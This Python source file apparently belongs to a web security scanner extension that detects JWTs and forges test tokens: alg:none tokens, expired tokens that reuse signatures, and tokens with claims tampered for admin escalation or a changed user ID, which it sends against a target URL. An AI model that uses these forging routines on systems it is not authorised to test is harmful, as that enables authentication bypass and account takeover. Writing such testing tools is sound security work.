"""JWT Editor — detect JWTs, test alg:none, key confusion, claim tampering.

Active + passive extension for JWT security testing.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import time
from typing import Any

import httpx

from models import Flow, PassiveFinding, ScanFinding

log = logging.getLogger("ext-jwt-editor")

NAME = "jwt-editor"
DESCRIPTION = "Detect JWTs in traffic, test alg:none, key confusion (RS→HS), claim tampering, expired acceptance"
CHECK_TYPE = "active"
ENABLED = False

_config: dict[str, Any] = {
    "test_alg_none": True,
    "test_key_confusion": True,
    "test_expired": True,
    "test_claim_tamper": True,
    "public_key": "",              # RS256 public key for key confusion attack
}

JWT_PATTERN = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')


def configure(config: dict) -> dict:
    _config.update(config)
    return {"status": "configured", "config": _config}


def get_state() -> dict:
    return {"config": _config}


def _b64url_decode(data: str) -> bytes:
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _decode_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Decode JWT into (header, payload, signature)."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _forge_alg_none(header: dict, payload: dict) -> str:
    """Create JWT with alg:none."""
    new_header = {**header, "alg": "none"}
    h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def _forge_expired_jwt(header: dict, payload: dict, original_sig: str) -> str:
    """Create JWT with expired timestamp but keep original signature."""
    new_payload = {**payload, "exp": int(time.time()) - 86400}  # expired 24h ago
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{original_sig}"


def _forge_claim_tamper(header: dict, payload: dict, original_sig: str) -> list[tuple[str, str]]:
    """Generate JWTs with tampered claims."""
    variants = []

    # Admin escalation
    for field in ("role", "admin", "is_admin", "user_type", "scope", "permissions"):
        if field in payload:
            new_payload = {**payload, field: "admin" if isinstance(payload[field], str) else True}
            h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
            p = _b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
            variants.append((f"{h}.{p}.{original_sig}", f"tampered {field}"))

    # User ID change
    for field in ("sub", "user_id", "uid", "id"):
        if field in payload:
            val = payload[field]
            if isinstance(val, int):
                new_payload = {**payload, field: val + 1}
            elif isinstance(val, str) and val.isdigit():
                new_payload = {**payload, field: str(int(val) + 1)}
            else:
                continue
            h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
            p = _b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
            variants.append((f"{h}.{p}.{original_sig}", f"changed {field}"))

    return variants


def passive_check(flow: Flow) -> list[PassiveFinding]:
    """Detect JWTs in request/response."""
    findings = []

    # Check request headers
    for name, value in flow.request.headers.items():
        for match in JWT_PATTERN.finditer(value):
            token = match.group()
            decoded = _decode_jwt(token)
            if decoded:
                header, payload, _ = decoded
                alg = header.get("alg", "unknown")
                findings.append(PassiveFinding(
                    flow_id=flow.id,
                    check_id="jwt-detected",
                    name=f"JWT Token Detected (alg: {alg})",
                    severity="info",
                    description=f"JWT in request header '{name}' using {alg}. Claims: {list(payload.keys())}",
                    evidence=token[:80] + "...",
                    url=flow.request.url,
                ))

                # Check for weak algorithms
                if alg.lower() in ("none", "hs256") and header.get("typ") == "JWT":
                    findings.append(PassiveFinding(
                        flow_id=flow.id,
                        check_id="jwt-weak-alg",
                        name=f"JWT Weak Algorithm: {alg}",
                        severity="medium" if alg.lower() == "hs256" else "high",
                        description=f"JWT uses potentially weak algorithm '{alg}'.",
                        evidence=f"alg={alg}",
                        url=flow.request.url,
                    ))

                # Check expiry
                exp = payload.get("exp")
                if exp and isinstance(exp, (int, float)):
                    if exp < time.time():
                        findings.append(PassiveFinding(
                            flow_id=flow.id,
                            check_id="jwt-expired",
                            name="Expired JWT Accepted",
                            severity="medium",
                            description=f"JWT expired at {time.strftime('%Y-%m-%d %H:%M', time.gmtime(exp))} but was still in use.",
                            evidence=f"exp={exp}",
                            url=flow.request.url,
                        ))

    return findings


async def active_check(url: str) -> list[ScanFinding]:
    """Active JWT manipulation tests."""
    findings = []

    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
        # First, get a response to look for JWTs
        try:
            resp = await client.get(url, follow_redirects=True)
        except Exception:
            return findings

        # Find JWTs in response
        all_text = resp.text + "\r\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        jwt_matches = JWT_PATTERN.findall(all_text)

        for token in jwt_matches[:3]:  # Test first 3 JWTs found
            decoded = _decode_jwt(token)
            if not decoded:
                continue

            header, payload, sig = decoded

            # Test alg:none
            if _config.get("test_alg_none"):
                none_token = _forge_alg_none(header, payload)
                try:
                    test_resp = await client.get(
                        url,
                        headers={"Authorization": f"Bearer {none_token}"},
                        follow_redirects=True,
                    )
                    if test_resp.status_code == 200:
                        findings.append(ScanFinding(
                            template_id="jwt_alg_none",
                            name="JWT Algorithm None Accepted",
                            severity="critical",
                            url=url,
                            matched_at=url,
                            description="Server accepts JWTs with alg:none, bypassing signature verification.",
                            extracted=[none_token[:60]],
                            source="extension",
                            confidence="confirmed",
                            remediation="Reject JWTs with alg:none. Enforce algorithm allowlist.",
                        ))
                except Exception:
                    pass

    return findings
